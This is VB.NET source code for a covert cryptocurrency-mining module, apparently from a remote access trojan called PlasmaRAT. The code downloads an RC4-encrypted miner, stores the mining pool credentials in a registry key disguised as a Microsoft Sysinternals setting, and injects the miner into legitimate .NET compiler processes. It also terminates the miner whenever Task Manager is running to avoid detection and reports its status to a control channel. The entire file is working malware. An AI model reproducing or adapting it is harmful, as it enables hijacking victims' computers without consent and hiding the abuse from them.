Imports System.IO
Imports System.IO.Compression
Module Miner
    Private Const SPI_SETSCREENSAVERACTIVE As Integer = 17
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByRef lpvParam As Integer, ByVal uWinIni As Integer) As Integer
    Dim RanMiner As Boolean = False

    Public PoolerMiner = InstallationOfEverything & "324234.TMP"
    Public MinerExecutable As String = "eAtShiTAnDDiE.exe"
   Public Sub MinerThreader()
        If RanMiner = True Then
            Try
                If (Process.GetProcessesByName("taskmgr").Length >= 1) Then
                    For Each Process In GetObject("winmgmts:").ExecQuery("Select Name from Win32_Process Where Name = '" & MinerExecutable & ".exe" & "'")
                        Process.Terminate()
                    Next
                Else
                    If (Process.GetProcessesByName(MinerExecutable).Length >= 1) Then
                    Else
                        RanMiner = False
                        BeginMiner()
                    End If
                End If


            Catch : End Try
        End If
    End Sub
    Public Sub BeginMiner()
        Try
            If RanMiner = False Then
                Dim TopLels = GetSetting("Microsoft", "Sysinternals", "id")
                If Not TopLels = String.Empty Then
                    Dim Sets = Split(TopLels, "*")
                    If IO.File.Exists(PoolerMiner) Then '
                        AllowAccess(PoolerMiner)
                        Dim cores = Environment.ProcessorCount
                        If cores = 0 Then cores = 1
                        If cores = 2 Then cores = 1
                        If cores = 3 Then cores = 2
                        If cores = 4 Then cores = 3
                        If cores = 6 Then cores = 4
                        If cores = 8 Then cores = 6
                        If cores = 12 Then cores = 10
                        If cores = 16 Then cores = 14
                        Dim MinerFile = My.Computer.FileSystem.ReadAllBytes(PoolerMiner)
                        Dim reversed = Proper_RC4(MinerFile, System.Text.Encoding.UTF8.GetBytes(PlasmaRAT.Username))
                        Array.Reverse(reversed, 0, reversed.Length)
                        Dim sCommand As String = "-a scrypt -o " & Sets(1) & " -O " & Sets(2) & ":" & Sets(3) & " -t" & cores.ToString
                        If mRunpe.InjectPE(reversed, System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory & "cvtres.exe", sCommand) Then
                            RanMiner = True
                            MinerExecutable = "cvtres"
                        ElseIf mRunpe.InjectPE(reversed, System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory & "vbc.exe", sCommand) Then
                            RanMiner = True
                            MinerExecutable = "vbc"
                        ElseIf mRunpe.InjectPE(reversed, System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory & "csc.exe", sCommand) Then
                            RanMiner = True
                            MinerExecutable = "csc"
                        ElseIf mRunpe.InjectPE(reversed, System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory & "ngen.exe", sCommand) Then
                            RanMiner = True
                            MinerExecutable = "ngen"
                        End If
                        Call SetScreenSaverActive(False)
                        If RanMiner = True Then
                            TalktoChannel("Miner: Injected into " & MinerExecutable & ".exe. Started Mining With " & cores.ToString & " Cores.", String.Empty)
                        Else
                            TalktoChannel("Miner: Failed to Inject.", String.Empty)
                        End If

                    End If
                End If
            Else
                TalktoChannel("Miner: Already Running on System", String.Empty)
            End If
        Catch
            TalktoChannel("Miner: Failed to Inject File.", String.Empty)
        End Try
    End Sub
    Public Sub InstallMiner(ByVal FileDownload As String, ByVal Pool As String, ByVal Username As String, ByVal Password As String)
        Try
            If Not IO.File.Exists(PoolerMiner) Then
                Dim wget As New System.Net.WebClient
                Dim b = wget.DownloadData(FileDownload)
                Dim e = Proper_RC4(b, System.Text.Encoding.UTF8.GetBytes(PlasmaRAT.Username))
                IO.File.WriteAllBytes(PoolerMiner, e)
            End If
            Call SaveSetting("Microsoft", "Sysinternals", "id", "*" & Pool & "*" & Username & "*" & Password & "*")
            BeginMiner()
        Catch ex As Exception
            TalktoChannel("Miner: Failed to Download Files. Error: " & ex.ToString, String.Empty)
        End Try
    End Sub
    Public Sub RemoveMiner()
        On Error Resume Next
        Dim TopLels = GetSetting("Microsoft", "Sysinternals", "id")
        If Not TopLels = String.Empty Then
            Call SaveSetting("Microsoft", "Sysinternals", "id", String.Empty)
            Dim Process As Object
            For Each Process In GetObject("winmgmts:").ExecQuery("Select Name from Win32_Process Where Name = '" & MinerExecutable & ".exe" & "'")
                Process.Terminate()
            Next
            RanMiner = False
            TalktoChannel("CPU Miner: Stopped Successfully.", String.Empty)

        End If




    End Sub

    Public Function SetScreenSaverActive(ByVal Active As Boolean) As Boolean
        Try
            Dim Result As Integer = SystemParametersInfo(SPI_SETSCREENSAVERACTIVE, CInt(Active), 0, 0)
            Return (Result > 0)
        Catch : End Try
    End Function
    Public Function Proper_RC4(ByVal Input As Byte(), ByVal Key As Byte()) As Byte()
        Try
            'Leave a thanks at least..
            'by d3c0mpil3r from HF
            Dim i, j, swap As UInteger
            Dim s As UInteger() = New UInteger(255) {}
            Dim Output As Byte() = New Byte(Input.Length - 1) {}

            For i = 0 To 255
                s(i) = i
            Next

            For i = 0 To 255
                j = (j + Key(i Mod Key.Length) + s(i)) And 255
                swap = s(i) 'Swapping of s(i) and s(j)
                s(i) = s(j)
                s(j) = swap
            Next

            i = 0 : j = 0
            For c = 0 To Output.Length - 1
                i = (i + 1) And 255
                j = (j + s(i)) And 255
                swap = s(i) 'Swapping of s(i) and s(j)
                s(i) = s(j)
                s(j) = swap
                Output(c) = Input(c) Xor s((s(i) + s(j)) And 255)
            Next

            Return Output
        Catch : End Try
    End Function
End Module
